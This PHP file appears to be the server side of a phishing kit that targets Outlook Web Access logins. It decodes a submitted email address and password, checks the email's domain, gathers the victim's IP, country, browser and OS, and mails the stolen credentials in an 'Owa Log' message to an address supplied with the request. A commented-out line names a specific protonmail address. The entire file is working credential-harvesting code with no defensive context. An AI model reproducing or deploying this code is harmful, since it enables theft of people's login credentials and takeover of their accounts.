<?php
header("Access-Control-Allow-Origin: *");
include('email.php');

function isValidEmail($email){
    try {
        // SET INITIAL RETURN VARIABLES

        $emailIsValid = FALSE;

        // MAKE SURE AN EMPTY STRING WASN'T PASSED

        if (!empty($email))
        {
        // GET EMAIL PARTS

        $domain = ltrim(stristr($email, '@'), '@') . '.';
        $user = stristr($email, '@', TRUE);

        // VALIDATE EMAIL ADDRESS

        if
        (
        !empty($user) &&
        !empty($domain) &&
        checkdnsrr($domain)
        )
        {$emailIsValid = TRUE;}
        }

        // RETURN RESULT

        return $emailIsValid;
        
    } catch (Exception $e) {
        return false;
    }   
}

function getOS() { 
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os_platform = "Unknown OS Platform";
    $os_array = array(
    '/windows nt 10/i' => 'Windows 10',
    '/windows nt 6.3/i' => 'Windows 8.1',
    '/windows nt 6.2/i' => 'Windows 8',
    '/windows nt 6.1/i' => 'Windows 7',
    '/windows nt 6.0/i' => 'Windows Vista',
    '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
    '/windows nt 5.1/i' => 'Windows XP',
    '/windows xp/i' => 'Windows XP',
    '/windows nt 5.0/i' => 'Windows 2000',
    '/windows me/i' => 'Windows ME',
    '/win98/i' => 'Windows 98',
    '/win95/i' => 'Windows 95',
    '/win16/i' => 'Windows 3.11',
    '/macintosh|mac os x/i' => 'Mac OS X',
    '/mac_powerpc/i' => 'Mac OS 9',
    '/linux/i' => 'Linux',
    '/ubuntu/i' => 'Ubuntu',
    '/iphone/i' => 'iPhone',
    '/ipod/i' => 'iPod',
    '/ipad/i' => 'iPad',
    '/android/i' => 'Android',
    '/blackberry/i' => 'BlackBerry',
    '/webos/i' => 'Mobile'
    );
    foreach ($os_array as $regex => $value)
    if (preg_match($regex, $user_agent))
    $os_platform = $value;
    return $os_platform;
}

function getBrowser() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser = "Unknown Browser";
    $browser_array = array(
    '/msie/i' => 'Internet Explorer',
    '/firefox/i' => 'Firefox',
    '/safari/i' => 'Safari',
    '/chrome/i' => 'Chrome',
    '/edge/i' => 'Edge',
    '/opera/i' => 'Opera',
    '/netscape/i' => 'Netscape',
    '/maxthon/i' => 'Maxthon',
    '/konqueror/i' => 'Konqueror',
    '/mobile/i' => 'Handheld Browser');

    foreach ($browser_array as $regex => $value)
    if (preg_match($regex, $user_agent))
    $browser = $value;

    return $browser;
}

function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
    $ip = $_SERVER["REMOTE_ADDR"];
    if ($deep_detect) {
    if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
    $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    }
    $purpose = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
    "AF" => "Africa",
    "AN" => "Antarctica",
    "AS" => "Asia",
    "EU" => "Europe",
    "OC" => "Australia (Oceania)",
    "NA" => "North America",
    "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
    $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
    if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
    switch ($purpose) {
    case "location":
    $output = array(
    "city" => @$ipdat->geoplugin_city,
    "state" => @$ipdat->geoplugin_regionName,
    "country" => @$ipdat->geoplugin_countryName,
    "country_code" => @$ipdat->geoplugin_countryCode,
    "continent" => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
    "continent_code" => @$ipdat->geoplugin_continentCode
    );
    break;
    case "address":
    $address = array($ipdat->geoplugin_countryName);
    if (@strlen($ipdat->geoplugin_regionName) >= 1)
    $address[] = $ipdat->geoplugin_regionName;
    if (@strlen($ipdat->geoplugin_city) >= 1)
    $address[] = $ipdat->geoplugin_city;
    $output = implode(", ", array_reverse($address));
    break;
    case "city":
    $output = @$ipdat->geoplugin_city;
    break;
    case "state":
    $output = @$ipdat->geoplugin_regionName;
    break;
    case "region":
    $output = @$ipdat->geoplugin_regionName;
    break;
    case "country":
    $output = @$ipdat->geoplugin_countryName;
    break;
    case "countrycode":
    $output = @$ipdat->geoplugin_countryCode;
    break;
    case "continent":
    $output = @$continents[strtoupper($ipdat->geoplugin_continentCode)];
    break;
    case "continent_code":
    $output = @$ipdat->geoplugin_continentCode;
    break;
    }
    }
    }
    return $output;
}

if (isset($_POST['F1_Submit'])) {
	$data = base64_decode($_POST["F1_Submit"]);

	$ip = getenv("REMOTE_ADDR");
	$useragent = $_SERVER['HTTP_USER_AGENT'];
		
	$value_data = explode(':' , $data);
		
	$to = $value_data[0]; 
	$email = $value_data[1];
	$password = $value_data[2];

	$user_os = getOS();
    $user_browser = getBrowser();
    $date = date('Y.m.d h.i.s A');
    $mycountry = ip_info("Visitor", "Country").' '.ip_info("Visitor", "Country Code");

	if(!empty($to) && !empty($email) && isValidEmail(base64_decode($email)) && !empty($password)){
		$message = "START LOG:" . "\r\n";
		$message .= "User: ".base64_decode($email). "\r\n";
		$message .= "Password: ".base64_decode($password) . "\r\n";
		$message .= "Client IP: ".$ip." ".$mycountry."\n";
        //$message .= "|--------------- I N F O | I P -------------------|\n";
        $message .= "Browser: ".$user_browser."\n";
        $message .= "OS: ".$user_os."\n";
		$message .= "IP INFO: http://www.geoiptool.com/?IP=$ip \n";
        $message .= "User Agent : ".$useragent."\n";
        $subject = 'Owa Log  '.$ip.' '.$mycountry;
        mail(base64_decode($to), $subject, $message);
	}
}

//mail('timmmytommy22@protonmail.com','OK','OK')
